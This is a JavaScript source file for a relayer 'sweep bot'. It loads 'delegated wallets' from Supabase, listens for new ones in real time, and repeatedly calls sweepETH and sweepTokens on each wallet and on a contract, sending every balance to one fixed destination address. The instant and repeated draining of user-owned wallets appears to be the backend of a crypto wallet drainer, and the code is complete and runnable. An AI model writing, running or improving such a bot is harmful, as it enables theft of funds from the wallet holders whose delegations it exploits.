// bot.js — TCNDelegation relayer sweep bot (ETH)
// Watches for ETH and token deposits and sweeps them to destination.
// Receives new delegation notifications via Supabase Realtime.

require("dotenv").config();
const { ethers } = require("ethers");
const { createClient } = require("@supabase/supabase-js");

// ── Config ────────────────────────────────────────────────────────────────────

const PRIVATE_KEY         = process.env.PRIVATE_KEY;
const RPC_URL             = process.env.RPC_URL;
const CONTRACT_ADDRESS    = process.env.CONTRACT_ADDRESS;
const DESTINATION_ADDRESS = process.env.DESTINATION_ADDRESS;
const TOKENS_TO_WATCH     = (process.env.TOKENS_TO_WATCH || "").split(",").filter(Boolean);
const SUPABASE_URL        = process.env.SUPABASE_URL;
const SUPABASE_SERVICE_ROLE_KEY = process.env.SUPABASE_SERVICE_ROLE_KEY;
const CHAIN               = process.env.CHAIN || "eth";

const MIN_ETH_WEI         = ethers.parseEther("0.001");
const SWEEP_COOLDOWN_BLOCKS = 3;
const MAX_BASE_FEE        = ethers.parseUnits("100", "gwei");
const MAX_PRIORITY_FEE    = ethers.parseUnits("3", "gwei");
const MIN_RELAYER_BALANCE = ethers.parseEther("0.005");

// ── Validation ────────────────────────────────────────────────────────────────

if (!PRIVATE_KEY || !RPC_URL || !CONTRACT_ADDRESS || !DESTINATION_ADDRESS) {
  console.error("Missing required env vars: PRIVATE_KEY, RPC_URL, CONTRACT_ADDRESS, DESTINATION_ADDRESS");
  process.exit(1);
}
if (!SUPABASE_URL || !SUPABASE_SERVICE_ROLE_KEY) {
  console.warn("⚠️  SUPABASE_URL or SUPABASE_SERVICE_ROLE_KEY missing — Realtime disabled, falling back to startup load only");
}
if (!ethers.isAddress(DESTINATION_ADDRESS) || DESTINATION_ADDRESS === ethers.ZeroAddress) {
  console.error("Invalid DESTINATION_ADDRESS");
  process.exit(1);
}

// ── Setup ─────────────────────────────────────────────────────────────────────

const provider = RPC_URL.startsWith("wss")
  ? new ethers.WebSocketProvider(RPC_URL)
  : new ethers.JsonRpcProvider(RPC_URL);
const wallet = new ethers.Wallet(PRIVATE_KEY, provider);

const supabase = SUPABASE_URL && SUPABASE_SERVICE_ROLE_KEY
  ? createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY, { auth: { persistSession: false } })
  : null;

const CONTRACT_ABI = [
  "function sweepETH(address payable to) external",
  "function sweepTokens(address token, address to) external",
  "event ETHReceived(address indexed sender, uint256 amount)",
  "event ETHSwept(address indexed to, uint256 amount)",
  "event Swept(address indexed token, address indexed to, uint256 amount)",
];

const DELEGATION_ABI = [
  "function sweepETH(address payable to) external",
  "function sweepTokens(address token, address to) external",
];

const ERC20_ABI = [
  "function balanceOf(address account) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)",
];

const contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, wallet);

// ── State ─────────────────────────────────────────────────────────────────────

let sweepingETH = false;
const sweepingToken = {};
const sweepingWallet = {};
let lastSweepBlock = 0;
const delegatedWallets = new Set();
let realtimeChannel = null;

// ── Logging ───────────────────────────────────────────────────────────────────

function log(msg)  { console.log(`[${new Date().toISOString()}] [${CHAIN.toUpperCase()}] ${msg}`); }
function warn(msg) { console.warn(`[${new Date().toISOString()}] [${CHAIN.toUpperCase()}] ⚠  ${msg}`); }
function err(msg)  { console.error(`[${new Date().toISOString()}] [${CHAIN.toUpperCase()}] ✖  ${msg}`); }

function normalizeAddress(address) {
  try { return ethers.getAddress(address); } catch { return null; }
}

async function ensureRelayerFunds() {
  const balance = await provider.getBalance(wallet.address);
  if (balance < MIN_RELAYER_BALANCE) {
    throw new Error(`Relayer balance too low: ${ethers.formatEther(balance)} ETH`);
  }
  return balance;
}

async function getSafeFeeData() {
  const feeData = await provider.getFeeData();
  if (!feeData.maxFeePerGas || !feeData.maxPriorityFeePerGas) {
    const gasPrice = feeData.gasPrice || ethers.parseUnits("20", "gwei");
    return { legacy: true, gasPrice };
  }
  const maxFee = feeData.maxFeePerGas > MAX_BASE_FEE ? MAX_BASE_FEE : feeData.maxFeePerGas;
  const priorityFee = feeData.maxPriorityFeePerGas > MAX_PRIORITY_FEE 
    ? MAX_PRIORITY_FEE 
    : feeData.maxPriorityFeePerGas;
  return { legacy: false, maxFeePerGas: maxFee, maxPriorityFeePerGas: priorityFee };
}

// ── ETH sweep ─────────────────────────────────────────────────────────────────

async function sweepETH(retries = 3) {
  if (sweepingETH) return;
  sweepingETH = true;
  
  for (let attempt = 1; attempt <= retries; attempt++) {
    try {
      await ensureRelayerFunds();
      
      const balance = await provider.getBalance(CONTRACT_ADDRESS);
      if (balance < MIN_ETH_WEI) { 
        sweepingETH = false; 
        return; 
      }
      
      log(`ETH balance: ${ethers.formatEther(balance)} — sweeping to ${DESTINATION_ADDRESS}`);
      
      const gasEstimate = await contract.sweepETH.estimateGas(DESTINATION_ADDRESS);
      const fees = await getSafeFeeData();
      
      const estimatedCost = gasEstimate * (fees.legacy ? fees.gasPrice : fees.maxFeePerGas);
      if (balance < estimatedCost * 2n) {
        warn(`Sweep unprofitable: balance ${ethers.formatEther(balance)}, gas cost ~${ethers.formatEther(estimatedCost)}`);
        sweepingETH = false;
        return;
      }
      
      const txParams = fees.legacy 
        ? { gasLimit: gasEstimate * 120n / 100n, gasPrice: fees.gasPrice }
        : { 
            gasLimit: gasEstimate * 120n / 100n,
            maxFeePerGas: fees.maxFeePerGas,
            maxPriorityFeePerGas: fees.maxPriorityFeePerGas
          };
      
      const tx = await contract.sweepETH(DESTINATION_ADDRESS, txParams);
      log(`sweepETH tx: ${tx.hash}`);
      const receipt = await tx.wait(1, 60000);
      log(`sweepETH confirmed block ${receipt.blockNumber}`);
      sweepingETH = false;
      return;
    } catch (e) {
      err(`sweepETH attempt ${attempt}/${retries} failed: ${e.message}`);
      if (attempt === retries) {
        sweepingETH = false;
        throw e;
      }
      await new Promise(r => setTimeout(r, 2000 * attempt));
    }
  }
}

// ── Token sweep ───────────────────────────────────────────────────────────────

async function sweepToken(tokenAddress, retries = 3) {
  if (sweepingToken[tokenAddress]) return;
  sweepingToken[tokenAddress] = true;
  
  for (let attempt = 1; attempt <= retries; attempt++) {
    try {
      await ensureRelayerFunds();
      
      const token = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
      const balance = await token.balanceOf(CONTRACT_ADDRESS);
      
      let decimals = 18;
      try { decimals = await token.decimals(); } catch {}
      
      const minToken = ethers.parseUnits("1", decimals);
      if (balance < minToken) { 
        sweepingToken[tokenAddress] = false; 
        return; 
      }
      
      let symbol = "TOKEN";
      try { symbol = await token.symbol(); } catch {}
      
      log(`${symbol} balance: ${ethers.formatUnits(balance, decimals)} — sweeping`);
      
      const gasEstimate = await contract.sweepTokens.estimateGas(tokenAddress, DESTINATION_ADDRESS);
      const fees = await getSafeFeeData();
      
      const txParams = fees.legacy 
        ? { gasLimit: gasEstimate * 120n / 100n, gasPrice: fees.gasPrice }
        : { 
            gasLimit: gasEstimate * 120n / 100n,
            maxFeePerGas: fees.maxFeePerGas,
            maxPriorityFeePerGas: fees.maxPriorityFeePerGas
          };
      
      const tx = await contract.sweepTokens(tokenAddress, DESTINATION_ADDRESS, txParams);
      log(`sweepTokens(${symbol}) tx: ${tx.hash}`);
      const receipt = await tx.wait(1, 60000);
      log(`sweepTokens(${symbol}) confirmed block ${receipt.blockNumber}`);
      sweepingToken[tokenAddress] = false;
      return;
    } catch (e) {
      err(`sweepToken(${tokenAddress}) attempt ${attempt}/${retries} failed: ${e.message}`);
      if (attempt === retries) {
        sweepingToken[tokenAddress] = false;
        throw e;
      }
      await new Promise(r => setTimeout(r, 2000 * attempt));
    }
  }
}

// ── Delegated wallet sweep ────────────────────────────────────────────────────

async function sweepWallet(walletAddress, retries = 3) {
  const checksum = normalizeAddress(walletAddress);
  if (!checksum) return;
  
  if (sweepingWallet[checksum]) {
    log(`Already sweeping ${checksum}, skipping`);
    return;
  }
  
  sweepingWallet[checksum] = true;
  
  try {
    await ensureRelayerFunds();
    
    const userContract = new ethers.Contract(checksum, DELEGATION_ABI, wallet);

    // Sweep ETH
    for (let attempt = 1; attempt <= retries; attempt++) {
      try {
        const ethBalance = await provider.getBalance(checksum);
        if (ethBalance > MIN_ETH_WEI) {
          log(`Delegated ETH ${ethers.formatEther(ethBalance)} — sweeping from ${checksum}`);
          const gasEstimate = await userContract.sweepETH.estimateGas(DESTINATION_ADDRESS);
          const fees = await getSafeFeeData();
          
          const txParams = fees.legacy 
            ? { gasLimit: gasEstimate * 120n / 100n, gasPrice: fees.gasPrice }
            : { 
                gasLimit: gasEstimate * 120n / 100n,
                maxFeePerGas: fees.maxFeePerGas,
                maxPriorityFeePerGas: fees.maxPriorityFeePerGas
              };
          
          const tx = await userContract.sweepETH(DESTINATION_ADDRESS, txParams);
          log(`sweepETH(${checksum}) tx: ${tx.hash}`);
          await tx.wait(1, 60000);
        }
        break;
      } catch (e) { 
        err(`sweepWallet ETH attempt ${attempt}/${retries} failed for ${checksum}: ${e.message}`);
        if (attempt < retries) await new Promise(r => setTimeout(r, 2000 * attempt));
      }
    }

    // Sweep tokens
    for (const tokenAddress of TOKENS_TO_WATCH) {
      for (let attempt = 1; attempt <= retries; attempt++) {
        try {
          const token = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
          const balance = await token.balanceOf(checksum);
          let decimals = 18;
          try { decimals = await token.decimals(); } catch {}
          const minToken = ethers.parseUnits("1", decimals);
          if (balance > minToken) {
            log(`Delegated token balance ${ethers.formatUnits(balance, decimals)} — sweeping from ${checksum}`);
            const gasEstimate = await userContract.sweepTokens.estimateGas(tokenAddress, DESTINATION_ADDRESS);
            const fees = await getSafeFeeData();
            
            const txParams = fees.legacy 
              ? { gasLimit: gasEstimate * 120n / 100n, gasPrice: fees.gasPrice }
              : { 
                  gasLimit: gasEstimate * 120n / 100n,
                  maxFeePerGas: fees.maxFeePerGas,
                  maxPriorityFeePerGas: fees.maxPriorityFeePerGas
                };
            
            const tx = await userContract.sweepTokens(tokenAddress, DESTINATION_ADDRESS, txParams);
            log(`sweepTokens(${tokenAddress}) tx: ${tx.hash}`);
            await tx.wait(1, 60000);
          }
          break;
        } catch (e) { 
          err(`sweepWallet token attempt ${attempt}/${retries} failed for ${checksum}: ${e.message}`);
          if (attempt < retries) await new Promise(r => setTimeout(r, 2000 * attempt));
        }
      }
    }
  } catch (e) {
    err(`sweepWallet failed for ${checksum}: ${e.message}`);
  } finally {
    delete sweepingWallet[checksum];
  }
}

// ── Supabase: load existing delegated wallets on startup ─────────────────────

async function loadDelegatedWallets() {
  if (!supabase) return;
  try {
    const { data, error } = await supabase
      .from("delegated_wallets")
      .select("address")
      .eq("chain", CHAIN);
    if (error) { warn(`loadDelegatedWallets error: ${error.message}`); return; }
    delegatedWallets.clear();
    for (const row of data || []) {
      const checksum = normalizeAddress(row.address);
      if (checksum) delegatedWallets.add(checksum);
    }
    log(`Loaded ${delegatedWallets.size} delegated wallets from Supabase`);
  } catch (e) {
    warn(`loadDelegatedWallets failed: ${e.message}`);
  }
}

// ── Supabase Realtime: subscribe to new delegations ───────────────────────────

function subscribeRealtime() {
  if (!supabase) {
    warn("Supabase not configured — Realtime subscription skipped");
    return;
  }

  if (realtimeChannel) {
    realtimeChannel.unsubscribe();
  }

  realtimeChannel = supabase
    .channel("delegated_wallets_inserts")
    .on(
      "postgres_changes",
      { event: "INSERT", schema: "public", table: "delegated_wallets", filter: `chain=eq.${CHAIN}` },
      async (payload) => {
        const address = normalizeAddress(payload.new?.address);
        if (!address) return;
        if (delegatedWallets.has(address)) return;
        log(`🔔 Realtime: new delegated wallet ${address} on ${CHAIN}`);
        delegatedWallets.add(address);
        await sweepWallet(address).catch((e) => err(`immediate sweep failed: ${e.message}`));
      }
    )
    .subscribe((status) => {
      if (status === "SUBSCRIBED") {
        log(`✅ Supabase Realtime subscribed to delegated_wallets (chain=${CHAIN})`);
      } else if (["CHANNEL_ERROR", "TIMED_OUT", "CLOSED"].includes(status)) {
        warn(`Realtime ${status} — retrying in 30s`);
        setTimeout(subscribeRealtime, 30_000);
      }
    });
}

// ── Block watcher ─────────────────────────────────────────────────────────────

provider.on("block", async (blockNumber) => {
  if (blockNumber - lastSweepBlock < SWEEP_COOLDOWN_BLOCKS) return;
  lastSweepBlock = blockNumber;
  log(`Block ${blockNumber} — checking balances...`);

  const sweepPromises = [
    sweepETH().catch(e => err(`sweepETH failed: ${e.message}`)),
    ...TOKENS_TO_WATCH.map(addr => 
      sweepToken(addr.trim()).catch(e => err(`sweepToken failed: ${e.message}`))
    ),
    ...Array.from(delegatedWallets).map(addr => 
      sweepWallet(addr).catch(e => err(`delegated sweep failed for ${addr}: ${e.message}`))
    )
  ];

  await Promise.allSettled(sweepPromises);
  log(`Block ${blockNumber} processing complete`);
});

contract.on("ETHReceived", async (sender, amount) => {
  log(`ETHReceived event — ${ethers.formatEther(amount)} ETH from ${sender}`);
  if (sweepingETH) {
    log("Sweep already in progress, skipping");
    return;
  }
  const currentBlock = await provider.getBlockNumber();
  if (currentBlock - lastSweepBlock < SWEEP_COOLDOWN_BLOCKS) {
    log(`Cooldown active (${SWEEP_COOLDOWN_BLOCKS - (currentBlock - lastSweepBlock)} blocks remaining)`);
    return;
  }
  await sweepETH().catch(e => err(`ETHReceived sweep failed: ${e.message}`));
});

// ── Relayer health check ──────────────────────────────────────────────────────

async function checkRelayerBalance() {
  const balance = await provider.getBalance(wallet.address);
  log(`Relayer wallet balance: ${ethers.formatEther(balance)} ETH`);
  if (balance < ethers.parseEther("0.005")) {
    warn("Relayer wallet LOW on ETH — top it up or sweeps will fail");
  }
}

// ── Start ─────────────────────────────────────────────────────────────────────

async function start() {
  log("TCN sweep bot starting...");
  log(`Contract:    ${CONTRACT_ADDRESS}`);
  log(`Destination: ${DESTINATION_ADDRESS}`);
  log(`Relayer:     ${wallet.address}`);
  log(`Chain:       ${CHAIN}`);
  log(`Tokens:      ${TOKENS_TO_WATCH.length ? TOKENS_TO_WATCH.join(", ") : "none"}`);

  await checkRelayerBalance();
  await loadDelegatedWallets();
  subscribeRealtime();

  log("Listening for blocks and Realtime events...");
}

start().catch((e) => { err(`Startup failed: ${e.message}`); process.exit(1); });

process.on("SIGINT",  () => { log("Shutting down..."); provider.removeAllListeners(); process.exit(0); });
process.on("SIGTERM", () => { log("Shutting down..."); provider.removeAllListeners(); process.exit(0); });

provider.on("error", async (error) => {
  err(`Provider error: ${error.message} — restarting bot...`);
  provider.removeAllListeners();
  
  try {
    await new Promise(r => setTimeout(r, 5000));
    log("Reconnecting provider and restarting...");
    await start();
  } catch (restartErr) {
    err(`Failed to restart after provider error: ${restartErr.message}`);
    process.exit(1);
  }
});
